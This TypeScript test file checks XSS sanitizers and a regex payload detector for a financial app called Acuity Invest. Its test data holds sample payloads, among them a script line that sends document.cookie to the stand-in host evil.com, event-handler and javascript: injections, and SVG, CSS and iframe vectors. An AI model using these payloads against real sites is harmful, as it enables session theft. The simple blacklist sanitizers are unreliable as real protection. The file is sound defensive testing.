// ============================================================
// Acuity Invest — XSS Prevention Security Tests
// Tests for Cross-Site Scripting attack prevention
// ============================================================

import { describe, it, expect } from 'vitest';

// --------------- Sanitization Functions ---------------

function sanitizeHtml(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

function sanitizeForAttribute(input: string): string {
  return input
    .replace(/[&<>"'\/]/g, (char) => {
      const map: Record<string, string> = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;',
      };
      return map[char] || char;
    });
}

function sanitizeMermaidLabel(label: string): string {
  // Remove any HTML tags
  let clean = label.replace(/<[^>]*>/g, '');
  // Remove event handlers
  clean = clean.replace(/on\w+\s*=/gi, '');
  // Remove javascript: protocol
  clean = clean.replace(/javascript\s*:/gi, '');
  // Remove data: protocol with script content
  clean = clean.replace(/data\s*:\s*text\/html/gi, '');
  // Escape special characters for Mermaid
  clean = clean.replace(/[[\]{}()|#&;]/g, '');
  return clean.trim();
}

function sanitizeUrl(url: string): string {
  const parsed = url.trim().toLowerCase();
  if (
    parsed.startsWith('javascript:') ||
    parsed.startsWith('data:') ||
    parsed.startsWith('vbscript:')
  ) {
    return '#';
  }
  return url;
}

function containsXssPayload(input: string): boolean {
  const patterns = [
    /<script[\s>]/i,
    /javascript\s*:/i,
    /on\w+\s*=\s*['"]/i,
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /<svg[\s>].*?on\w+/i,
    /expression\s*\(/i,
    /url\s*\(\s*['"]?\s*javascript/i,
  ];
  return patterns.some((p) => p.test(input));
}

// --------------- Tests ---------------

describe('XSS Prevention', () => {
  // --- Script Tag Injection ---

  describe('Script Tag Sanitization', () => {
    it('should sanitize <script> tags in query', () => {
      const malicious = '<script>alert("XSS")</script>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('&lt;script&gt;');
    });

    it('should sanitize nested script tags', () => {
      const malicious = '<scr<script>ipt>alert(1)</script>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<script>');
    });

    it('should sanitize script tags with attributes', () => {
      const malicious = '<script type="text/javascript">document.cookie</script>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<script');
    });

    it('should sanitize uppercase SCRIPT tags', () => {
      const malicious = '<SCRIPT>alert(1)</SCRIPT>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<SCRIPT>');
    });

    it('should detect script tags in input', () => {
      expect(containsXssPayload('<script>alert(1)</script>')).toBe(true);
      expect(containsXssPayload('Hello world')).toBe(false);
    });
  });

  // --- Event Handler Injection ---

  describe('Event Handler Sanitization', () => {
    it('should sanitize onload event handler', () => {
      const malicious = '<img src="x" onerror="alert(1)">';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onerror=');
      expect(containsXssPayload(malicious)).toBe(true);
    });

    it('should sanitize onclick event handler', () => {
      const malicious = '<div onclick="steal(document.cookie)">Click me</div>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onclick=');
    });

    it('should sanitize onmouseover event handler', () => {
      const malicious = '<a onmouseover="alert(1)">Hover me</a>';

      expect(containsXssPayload(malicious)).toBe(true);
    });

    it('should sanitize onfocus event handler', () => {
      const malicious = '<input onfocus="alert(1)" autofocus>';

      expect(containsXssPayload(malicious)).toBe(true);
    });
  });

  // --- href="javascript:" Injection ---

  describe('JavaScript Protocol Sanitization', () => {
    it('should sanitize href="javascript:" in response', () => {
      const malicious = 'javascript:alert(document.cookie)';
      const sanitized = sanitizeUrl(malicious);

      expect(sanitized).toBe('#');
    });

    it('should sanitize javascript: with whitespace', () => {
      const malicious = '  javascript : alert(1)';
      const sanitized = sanitizeUrl(malicious);

      expect(sanitized).toBe('#');
    });

    it('should sanitize data: URL with HTML content', () => {
      const malicious = 'data:text/html,<script>alert(1)</script>';
      const sanitized = sanitizeUrl(malicious);

      expect(sanitized).toBe('#');
    });

    it('should sanitize vbscript: protocol', () => {
      const malicious = 'vbscript:msgbox("XSS")';
      const sanitized = sanitizeUrl(malicious);

      expect(sanitized).toBe('#');
    });

    it('should allow valid URLs', () => {
      const validUrls = [
        'https://example.com',
        'http://localhost:3000',
        '/api/v1/insights',
        '#section',
      ];

      for (const url of validUrls) {
        expect(sanitizeUrl(url)).toBe(url);
      }
    });
  });

  // --- HTML in Table Cells ---

  describe('HTML in Table Cell Sanitization', () => {
    it('should properly escape HTML in table cells', () => {
      const cellContent = '<img src=x onerror=alert(1)>';
      const sanitized = sanitizeHtml(cellContent);

      expect(sanitized).not.toContain('<img');
      expect(sanitized).toContain('&lt;img');
    });

    it('should escape ticker names with HTML', () => {
      const maliciousTicker = 'AAPL<script>alert(1)</script>';
      const sanitized = sanitizeHtml(maliciousTicker);

      expect(sanitized).toContain('AAPL');
      expect(sanitized).not.toContain('<script>');
    });

    it('should escape portfolio names with HTML', () => {
      const maliciousName = 'My Portfolio"><img src=x onerror=alert(1)>';
      const sanitized = sanitizeForAttribute(maliciousName);

      expect(sanitized).not.toContain('"');
      expect(sanitized).not.toContain('<img');
    });

    it('should escape gain/loss values with embedded HTML', () => {
      const maliciousValue = '+30%<script>fetch("evil.com?cookie="+document.cookie)</script>';
      const sanitized = sanitizeHtml(maliciousValue);

      expect(sanitized).toContain('+30%');
      expect(sanitized).not.toContain('<script>');
    });
  });

  // --- Mermaid Chart Label XSS ---

  describe('Mermaid Chart Label Sanitization', () => {
    it('should sanitize Mermaid chart labels for XSS', () => {
      const maliciousLabel = 'AAPL<script>alert(1)</script>';
      const sanitized = sanitizeMermaidLabel(maliciousLabel);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('AAPL');
    });

    it('should remove event handlers from Mermaid labels', () => {
      const maliciousLabel = 'Stock onclick=alert(1)';
      const sanitized = sanitizeMermaidLabel(maliciousLabel);

      expect(sanitized).not.toContain('onclick=');
    });

    it('should remove javascript: from Mermaid labels', () => {
      const maliciousLabel = 'Click javascript:alert(1)';
      const sanitized = sanitizeMermaidLabel(maliciousLabel);

      expect(sanitized).not.toContain('javascript:');
    });

    it('should handle Mermaid labels with special characters', () => {
      const label = 'Portfolio [Total: $26,350]';
      const sanitized = sanitizeMermaidLabel(label);

      expect(sanitized).not.toContain('[');
      expect(sanitized).not.toContain(']');
    });

    it('should sanitize Mermaid node definitions', () => {
      const maliciousNode = 'A["<img src=x onerror=alert(1)>"]';
      const sanitized = sanitizeMermaidLabel(maliciousNode);

      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('onerror');
    });
  });

  // --- SVG Injection ---

  describe('SVG Injection Prevention', () => {
    it('should detect SVG with event handlers', () => {
      const malicious = '<svg onload="alert(1)">';

      expect(containsXssPayload(malicious)).toBe(true);
    });

    it('should sanitize SVG in user input', () => {
      const malicious = '<svg><script>alert(1)</script></svg>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<svg>');
      expect(sanitized).not.toContain('<script>');
    });
  });

  // --- CSS Injection ---

  describe('CSS Injection Prevention', () => {
    it('should detect CSS expression() attacks', () => {
      const malicious = 'background: expression(alert(1))';

      expect(containsXssPayload(malicious)).toBe(true);
    });

    it('should detect CSS url(javascript:) attacks', () => {
      const malicious = "background: url('javascript:alert(1)')";

      expect(containsXssPayload(malicious)).toBe(true);
    });
  });

  // --- iframe Injection ---

  describe('iframe Injection Prevention', () => {
    it('should detect iframe injection', () => {
      const malicious = '<iframe src="https://evil.com"></iframe>';

      expect(containsXssPayload(malicious)).toBe(true);
    });

    it('should detect object/embed injection', () => {
      expect(containsXssPayload('<object data="evil.swf">')).toBe(true);
      expect(containsXssPayload('<embed src="evil.swf">')).toBe(true);
    });
  });
});
